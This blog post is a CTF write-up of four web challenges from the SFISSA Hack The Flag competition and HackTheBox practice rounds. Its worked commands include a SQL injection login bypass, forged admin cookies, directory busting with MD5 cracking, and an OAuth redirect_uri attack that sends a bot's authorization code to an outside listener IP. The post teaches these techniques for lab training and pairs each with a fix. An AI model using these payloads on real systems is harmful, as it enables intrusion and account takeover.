---
layout: post
title: "82 of 83: First Place at the SFISSA Hack The Flag Beginner CTF"
date: 2026-09-19
author: Shaamad Allison
tags: [ctf, web, sfissa, writeup]
---

We went in knowing we could win. We came out having won 82 of 83 flags — **first place** — with the one we couldn't crack still living rent-free in my head. I'm choosing to call that a success.

This is the writeup for the SFISSA Hack The Flag Beginner CTF on September 19, 2026. Four web challenge breakdowns, some thoughts on where AI fits into competitive hacking, and the story of how a high school team nearly took it from us in the final hours.

## The Setup

SFISSA has been running Hack The Flag since Fall 2024 and it's become one of the events I actually look forward to. It's well-organized, the challenges are genuinely interesting, and the community around it — the South Florida infosec scene — is one I've been building connections in since the club started taking it seriously. This year's beginner division had a solid field, and our team came in with one goal: first place.

We had people working to their strengths from the jump. Web challenges went to whoever had the most context on the current challenge. Crypto and forensics went to the people who had prepped those areas. Nobody was flying solo on anything hard. That coordination is the thing that separates a group of good individuals from an actual team, and ours had it.

The competition also had a cool undercurrent this time: **AI was everywhere.** Not just us — teams across the field were using LLMs to speed up pattern recognition, draft exploit chains, check syntax, explain unfamiliar concepts mid-challenge. Chad Hamad from **Cinch** even came through and demoed a local model setup purpose-built for CTF work — a self-hosted stack that could reason over challenge files without sending anything offsite. That's where the scene is heading and it was genuinely exciting to see it being used in practice, not just talked about.

Alyson Zamora from **NextEra Energy** was also there, and seeing familiar faces from the industry at community events like this is always a reminder of why showing up matters. The scene is small and the same people keep finding each other in the best way.

## The Race

We held first place for most of the competition, but it wasn't clean. A high school team called **Decode** was right behind us for the better part of the day — one flag away at their closest. That's a level of pressure I wasn't expecting from a beginner division, and honestly, respect. They were sharp, fast, and clearly prepared. The gap only widened in the final stretch when we were able to push through a few challenges they hadn't cracked yet.

Finishing 82 of 83 stings a little. The one we missed — **Labors of Debugules** — was a multi-stage PHP web challenge that we got deep into. We had RCE, we read the database, we found credentials, we forged admin sessions. But the flag was sitting in a file owned by root with permissions that our webshell's unprivileged user couldn't reach. We threw everything at it for hours and never crossed that last line. It happens. What I'll remember is that we stayed on it instead of giving up, and that matters more than whether it fell.

Going from **2nd to 1st** was the arc of our SFISSA story — we've had strong showings before but kept finishing just off the top. Locking it in this time, especially with newer members contributing flags they'd never have gotten a year ago, felt like proof that the club is actually growing in the right direction.

## The Web Challenges

Here are four of the web challenges I worked through during the competition. Two were from HackTheBox practice rounds leading into the event, two were from the SFISSA CTF itself.

---

### MFlow
**Platform:** HackTheBox | **Category:** Web | **Difficulty:** Very Easy | **Points:** 800

A Flask/Werkzeug app with two chained vulnerabilities: SQL injection on login and an unsigned base64 session cookie that trusts whatever role data the client sends.

**Step 1 — SQL Injection Login Bypass**

The login form had no parameterization. Classic SQLi bypass:

```
Username: ' OR 1=1--
Password: anything
```

That logged us in as the first user in the database.

**Step 2 — Cookie Manipulation**

After login, the app dropped a session cookie:

```
auth=eyJ1c2VybmFtZSI6ICJsb2wiLCAiaXNfYWRtaW4iOiBmYWxzZX0=
```

Decoded from base64:

```json
{"username": "lol", "is_admin": false}
```

No HMAC signature — just raw base64. Flipped `is_admin` to `true`, re-encoded, and sent the forged cookie to `/dashboard`. Server accepted it without complaint.

```json
{"username": "lol", "is_admin": true}
```

```
auth=eyJ1c2VybmFtZSI6ICJsb2wiLCAiaXNfYWRtaW4iOiB0cnVlfQ==
```

**Flag:** `HTB{s3ss10n_int3gritY_1s_n0t_t0_b3_m3ss3d_w1th_f0668c0d311b5ad14d00050536b1ce55}`

**Takeaway:** Never store authorization data in unsigned client-side cookies. Use HMAC-signed tokens (`itsdangerous`, JWT with a real secret) or server-side sessions. Parameterize your queries.

---

### GoGoBuster
**Platform:** HackTheBox | **Category:** Web | **Difficulty:** Easy | **Points:** 950

A Flask app with directory listing enabled on a `/backups/` path. The backup contained a SQL dump with MD5-hashed credentials. The challenge name is the hint.

**Step 1 — Directory Busting**

```bash
gobuster dir \
  -u http://154.57.164.70:30723 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -t 50
```

```
/login     (Status: 200)
/static    (Status: 301)
/backups   (Status: 301)  ← here we go
/dashboard (Status: 403)
```

**Step 2 — Exposed Backup Directory**

`/backups/` had `autoindex` on, serving:

```
invoices.csv
mflow_sales_management_20240404.sql
```

**Step 3 — SQL Dump**

The dump included the full `users` table:

```sql
INSERT INTO `users` VALUES
(1,'admin','5416d7cd6ef195a0f7622a9c56b55e84',1),
...
```

`is_admin: 1` confirmed target account. MD5 hash, so crackstation.net:

```
5416d7cd6ef195a0f7622a9c56b55e84 → 1q2w3e4r
```

**Step 4 — Login and Flag**

```bash
curl -X POST http://154.57.164.70:30723/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"1q2w3e4r"}' \
  -c cookies.txt
```

Dashboard returned the flag on successful login.

**Takeaway:** Disable directory listing in production (`autoindex off` in nginx). Never expose backup files via a web-accessible path. MD5 is trivially crackable — use bcrypt or argon2.

---

### Paradise Vault
**Platform:** SFISSA Hack The Flag | **Category:** Web | **Difficulty:** Easy | **Points:** 875

A Node.js app with login → MFA flow. Three chained issues: default credentials, and an OTP that the server returns directly in the API response instead of sending it out-of-band.

**Step 1 — Recon**

Fetched login page source, found it loads `auth.js`. The JS revealed the app POSTs JSON to `/api/login`. Gobuster turned up:

```
/logout   (Status: 302)
/mfa      (Status: 302)  ← redirects unauthenticated users away
/static   (Status: 301)
```

**Step 2 — Default Credentials**

The challenge said "Biff is not that bright." After trying Biff-themed passwords, the real answer was:

```
Username: admin
Password: admin
```

Server returned HTTP 200 with a signed JWT session cookie:

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzg5ODMyMDU5fQ.<sig>
```

Decoded: `{"username":"admin","iat":1789832059}`

**Step 3 — OTP Information Disclosure**

With the session cookie, `/mfa` became accessible. `mfa.js` revealed:
- `GET /api/otp/request` — generates the OTP
- `POST /api/otp/verify` — verifies it and returns the flag

Called the request endpoint:

```bash
curl -s http://154.57.164.82:30707/api/otp/request -b cookies.txt
```

Response:

```json
{"otp":628222}
```

The OTP came back **in the HTTP response body.** There was nothing to brute force — the server handed it over. Submitted it immediately:

```bash
curl -s -X POST http://154.57.164.82:30707/api/otp/verify \
  -H 'Content-Type: application/json' \
  -b cookies.txt \
  -d '{"otp":628222}'
```

**Flag:** `HTB{l34k1ng_0Tp_1nt0_Cl13n7s1d3_1s_b4d_ecd84c35fa3158bab4748e62135e3c10}`

**Takeaway:** Never return the OTP in the response that generates it — the whole point is out-of-band delivery. MFA only works if the second factor travels a different channel.

---

### Gateway
**Platform:** SFISSA Hack The Flag | **Category:** Web | **Difficulty:** Medium | **Points:** 950

A Node.js/Express app implementing a custom OAuth 2.0 Authorization Code flow with a support ticket bot that visits paths as an authenticated admin. The vulnerability: **redirect_uri validation bypass** — the authorization server never checks the redirect URI against a registered allowlist.

**Step 1 — Source Code Review**

Downloaded the scenario files. Key findings:
- `/support/ticket` (POST) — takes a `path` param and triggers `botService.visitPath(path)`
- `bot.service.js` — logs in as admin, then fetches `http://localhost:3000<path>` with redirect following enabled (`maxRedirects: 5`)
- `oauth.service.js` — `validateAuthorizeRequest()` checks that `redirect_uri` is *present*, but **never validates it against the registered client URL**
- `client.controller.js` — returns the flag to any valid Bearer token

**Step 2 — Leak the client_id**

The `/login` page renders the full OAuth authorize URL:

```bash
curl -s http://154.57.164.66:32256/login | grep -o 'client_id=[^&"]*' | head -1
# client_id=4a48f9de34ff8b1c5a3cc4410fd6b516
```

**Step 3 — Start a Listener on Pwnbox**

```bash
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('CODE CAPTURED:', self.path)
        self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 9001), H).serve_forever()
"
```

**Step 4 — Poisoned Support Ticket**

Submitted a ticket pointing the bot at `/oauth/authorize` with our Pwnbox as `redirect_uri`:

```bash
curl -s -X POST http://154.57.164.66:32256/support/ticket \
  --data-urlencode "path=/oauth/authorize?response_type=code&client_id=4a48f9de34ff8b1c5a3cc4410fd6b516&redirect_uri=http://51.79.102.224:9001/callback&scope=read:profile&state=abc"
```

Bot logged in as admin, hit `/oauth/authorize` with a valid `auth_session` cookie, and the server redirected it — without ever checking the destination — straight to our listener:

```
CODE CAPTURED: /callback?code=8df168bd-cce2-4090-aa45-b7590f6bce3a&state=abc
```

**Step 5 — Exchange Code for Token**

```bash
curl -s -X POST http://154.57.164.66:32256/oauth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "grant_type=authorization_code&code=8df168bd-cce2-4090-aa45-b7590f6bce3a&redirect_uri=http://51.79.102.224:9001/callback&client_id=4a48f9de34ff8b1c5a3cc4410fd6b516"
# {"access_token":"4606913b-b253-4368-97bb-50ca11d1dc17","token_type":"Bearer","expires_in":3600}
```

No `client_secret` check — just `client_id`, `code`, and matching `redirect_uri`.

**Step 6 — Retrieve the Flag**

```bash
curl -s http://154.57.164.66:32256/profile \
  -H "Authorization: Bearer 4606913b-b253-4368-97bb-50ca11d1dc17"
```

**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`

**Takeaway:** Always validate `redirect_uri` against a strict pre-registered allowlist — exact match, not prefix. RFC 6749 requires this. A bot that visits attacker-controlled paths as an authenticated user is a loaded gun; combining it with unvalidated OAuth produces full account takeover.

---

## Wrapping Up

First place at SFISSA HTF Beginner. 82 of 83 flags. One stubborn PHP challenge that we'll figure out in our own time.

The thing I keep thinking about after this one isn't the flag we missed — it's the energy in the room. Newer club members were grinding challenges they wouldn't have known how to approach six months ago. The team communicated, stayed organized under pressure, and actually used the tools at our disposal (including AI) intelligently instead of just vibing. That's growth, and it's what makes competing actually worth it.

See you at the next one.

![SFISSA HTF team at the award ceremony — first place](https://shaamad.space/assets/img/sfissa-htf-2026-win.jpg)
*The team, 1st place card in hand. The flag we couldn't get only makes the next event more interesting.*

![SFISSA group photo — full conference turnout](https://shaamad.space/assets/img/sfissa-htf-2026-group.jpg)
*The South Florida ISSA community — one of the best rooms to be in if you're trying to actually learn this craft.*
